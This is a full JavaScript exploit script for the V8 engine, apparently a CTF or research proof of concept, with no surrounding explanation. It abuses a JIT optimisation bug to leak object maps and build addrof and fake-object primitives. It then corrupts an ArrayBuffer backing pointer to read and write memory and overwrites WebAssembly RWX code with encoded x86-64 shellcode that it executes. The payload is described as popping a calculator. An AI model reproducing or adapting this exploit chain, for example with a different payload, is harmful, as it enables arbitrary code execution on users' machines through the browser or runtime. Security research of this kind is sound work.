function gc()
{
	/*fill-up the 1MB semi-space page, force V8 to scavenge NewSpace.*/
    for(var i=0;i<((1024 * 1024)/0x10);i++)
	{
        var a= new String();
    }
}
function give_me_a_clean_newspace()
{
	/*force V8 to scavenge NewSpace twice to get a clean NewSpace.*/
	gc()
	gc()
}
let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
function d2u(v) {
    f64[0] = v;
    return u32;
}
function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64;
}
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}
// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));
    return res.join('');
}
// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");
    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);
    return bytes;
}
function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);
    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }
    return lines.join('\n');
}
// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);
    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },
        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");
            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },
        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();
//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//
// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);
    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;
            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }
    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");
        return Struct.unpack(Struct.float64, bytes);
    };
    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");
        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);
        return res;
    };
    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };
    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };
    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };
    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.
    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }
    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);
        return this.assignAdd(this, Int64.One);
    }, 1);
    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}
// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};
// Convenience functions. These allocate a new Int64 to hold the result.
// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}
// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}
// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}
// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
function utf8ToString(h, p) {
  let s = "";
  for (i = p; h[i]; i++) {
    s += String.fromCharCode(h[i]);
  }
  return s;
}
let global_var = Array();
let double_map , element_map , double_map_obj , array_map , victim_jsarray,victim_arraybuffer;
let global_tmp = [];

var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,138,128,128,128,0,2,96,0,1,127,96,1,127,1,127,2,140,128,128,128,0,1,3,101,110,118,4,112,117,116,115,0,1,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,112,52,110,100,97,0,1,10,145,128,128,128,0,1,139,128,128,128,0,1,1,127,65,16,16,0,26,32,0,11,11,150,128,128,128,0,1,0,65,16,11,16,72,97,99,107,101,100,32,98,121,32,80,52,110,100,97,0]);
var wasmImports = {
  env: {
    puts: function puts (index) {
      console.log(utf8ToString(h, index));
    }
  }
};
let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
let h = new Uint8Array(m.exports.memory.buffer);
let f = m.exports.p4nda;
console.log("step 0: Game start");
f();

function exploit(){
	function get_map_opt(x){
		let arr = [1.1,1.2,1.3,1.4];
		let arr_ele = [arr,arr,arr,arr];

		let index = 0;
		if(x = 'p4nda'){index = 4;}
		return [arr[index],arr,arr_ele];
	}
	function get_map(){
		var tmp ;
		for(var i = 0; i< 10000;i++){
			tmp = get_map_opt('test');
		}
		double_map = tmp[0];
		element_map =Add(Int64.fromDouble(double_map), 0xa0).asDouble();
		global_var.push(tmp[1]);
		global_var.push(tmp[2]);
	}
	get_map();
	console.log("double_map:",Int64.fromDouble(double_map));
	console.log("element_map:",Int64.fromDouble(element_map));
	function get_array_map_opt(x){
		let a = Array(2);
		a[0] = 1.1;
		a[1] = 1.2;
		let b = {a0:1.1 , a1:1.1 , a2:1.1 , a3:1.1 , a4:1.1 , a5:1.1 , a6:1.1 , a7:1.1 , a8:1.1 , a9:1.1 , a10:1.1 , a11:1.1 , a12:1.1 , a13:1.1 , a14:1.1 , a15:1.1 , a16:1.1 , a17:1.1 , a18:1.1 , a19:1.1 , a20:1.1 , a21:1.1 , a22:1.1 , a23:1.1 , a24:1.1 , a25:1.1 , a26:1.1 , a27:1.1 , a28:1.1 , a29:1.1};
		let index = 0;
		if(x = 'p4nda'){index = 2;}
		return [a[index],b];
	}

	function get_array_map(){
		for(var i = 0; i< 10000; i++){
			var tmp = get_array_map_opt();
		}
		array_map  = tmp[0];
		global_tmp.push(tmp[1]);
		//%DebugPrint(tmp[1]);
	}
	get_array_map();
	console.log("array_map",Int64.fromDouble(array_map));	
	function prepare_double_map_opt(x){
		let arr = [double_map,double_map,double_map,double_map];
		let index = 0;
		if(x = 'p4nda'){index = 4;}
		arr[index] = element_map;
		return arr;
	}

	function prepare_double_map(){
		var tmp;
		for (var i = 0; i< 10000;i++){
			tmp = prepare_double_map_opt();
		}
		return tmp[1];
	}

    double_map_obj = prepare_double_map();

    function addrof_opt(obj){
        var a = [obj, obj, obj, obj];
		let index = 0;
		if(x = 'p4nda'){index = 4};
        a[index] = double_map_obj; 
        return a;
    }
    function addrof(obj){
		for(var i = 0;i<100000;i++){
			var a = addrof_opt(obj);
		}
		return a[0];
	}
	f_obj_addr = Int64.fromDouble(addrof(f))
	console.log("address of function obj:",f_obj_addr);
	//%DebugPrint(f);
	function get_victim_obj_opt(x){
		let b = [11.1,1.1];		
		let index = 0;
		if (x = 'p4nda'){index = 2;}
		b[index] = array_map;
		console.log(b.length);
		return b;

	}
	function get_victim_obj(){
		for (var i = 0 ; i < 10000; i++){
			var tmp = get_victim_obj_opt();
		}
		victim_arraybuffer = new ArrayBuffer(0x100);
		victim_jsarray = tmp;
	}

 	get_victim_obj();
	//%DebugPrint(victim_jsarray);
	//%DebugPrint(victim_arraybuffer);
	console.log(Int64.fromDouble(victim_jsarray.a5));
	victim_jsarray.a5 = f_obj_addr.asDouble();
	let dv = new DataView(victim_arraybuffer);
    SharedFunctionInfo_addr = Int64.fromDouble(dv.getFloat64(0x17,true));
    console.log("[+] SharedFunctionInfo addr :"+SharedFunctionInfo_addr);
	victim_jsarray.a5 = SharedFunctionInfo_addr.asDouble();
    WasmExportedFunctionData_addr =  Int64.fromDouble(dv.getFloat64(0x7,true));
    console.log("[+] WasmExportedFunctionData addr :"+WasmExportedFunctionData_addr); 
	//let tmp = addrof(f);
	victim_jsarray.a5 = WasmExportedFunctionData_addr.asDouble();	
    WasmInstanceObject_addr =  Int64.fromDouble(dv.getFloat64(0xf,true));
    console.log("[+] WasmInstanceObject addr :"+WasmInstanceObject_addr);   

	victim_jsarray.a5 = WasmInstanceObject_addr.asDouble();	
    imported_function_targets_addr =  Int64.fromDouble(dv.getFloat64(0x3f,true));
    console.log("[+] imported_function_targets addr :"+imported_function_targets_addr);

    victim_jsarray.a5 = imported_function_targets_addr.asDouble();
    rwx_area = Int64.fromDouble(dv.getFloat64(0,true));
    console.log("[+] rwx_area addr :"+rwx_area);
    victim_jsarray.a5 = rwx_area.asDouble();
    let shellcode_calc = [72, 49, 201, 72, 129, 233, 247, 255, 255, 255, 72, 141, 5, 239, 255, 255, 255, 72, 187, 124, 199, 145, 218, 201, 186, 175, 93, 72, 49, 88, 39, 72, 45, 248, 255, 255, 255, 226, 244, 22, 252, 201, 67, 129, 1, 128, 63, 21, 169, 190, 169, 161, 186, 252, 21, 245, 32, 249, 247, 170, 186, 175, 21, 245, 33, 195, 50, 211, 186, 175, 93, 25, 191, 225, 181, 187, 206, 143, 25, 53, 148, 193, 150, 136, 227, 146, 103, 76, 233, 161, 225, 177, 217, 206, 49, 31, 199, 199, 141, 129, 51, 73, 82, 121, 199, 145, 218, 201, 186, 175, 93];
    let write_tmp = new Uint8Array(victim_arraybuffer);
    write_tmp.set(shellcode_calc);
    console.log("[+] Enter to pop up a calc ... ");
	readline();

	f();
}

exploit();

